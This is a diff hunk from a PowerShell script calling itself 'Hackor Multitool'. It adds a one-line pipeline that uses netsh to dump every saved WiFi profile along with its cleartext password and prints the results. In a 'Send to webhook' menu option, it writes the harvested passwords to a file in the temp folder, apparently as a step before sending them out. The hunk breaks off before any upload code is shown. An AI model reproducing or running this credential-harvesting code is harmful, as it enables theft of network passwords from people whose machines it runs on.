@@ -32,12 +32,13 @@ function Start-HackorMultitool {
                 Clear-Host
                 Write-Host "================ Hackor Multitool -> WiFi Networks ================"
                 Write-Host "Scanning saved WiFi Networks..."
+                $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+                Write-Host $wifiProfiles
                 Write-Host "1: Send to webhook"
                 Write-Host "2: Back"
                 $selection2 = Read-Host "Please make a selection"
                 switch ($selection2) {
                     '1' {
-                        $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
                         $filePath = "$env:TEMP/--wifi-pass.txt"
                         $wifiProfiles | Out-File -FilePath $filePath
                         
